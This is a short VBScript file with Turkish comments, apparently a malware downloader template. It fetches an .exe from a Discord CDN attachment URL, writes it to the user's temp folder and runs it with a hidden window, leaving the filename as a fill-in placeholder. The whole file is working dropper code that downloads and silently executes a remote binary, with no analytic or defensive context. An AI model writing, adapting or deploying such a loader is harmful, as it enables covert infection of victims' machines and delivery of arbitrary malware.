Set objShell = CreateObject("WScript.Shell")
Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStrm = CreateObject("Adodb.Stream")

Dim strUrl: strUrl = "https://cdn.discordapp.com/attachments/1337/1337/Bylldgo.exe "
Dim strTempDir: strTempDir = objShell.ExpandEnvironmentStrings("%temp%")
Dim strFileName: strFileName = "Buraya Dosyanın Adı Girilmesi Gerekiyor"
Dim strFilePath: strFilePath = strTempDir & "\" & strFileName

xHttp.Open "GET", strUrl, False
xHttp.Send

If xHttp.Status = 200 Then
    With bStrm
        .Type = 1 ' // binary
        .Open
        .Write xHttp.responseBody
        .SaveToFile strFilePath, 2 ' // overwrite
        .Close
    End With

    objShell.Run strFilePath, 0, False ' İndirilen dosyayı çalıştır
End If

Set xHttp = Nothing
Set bStrm = Nothing
Set objShell = Nothing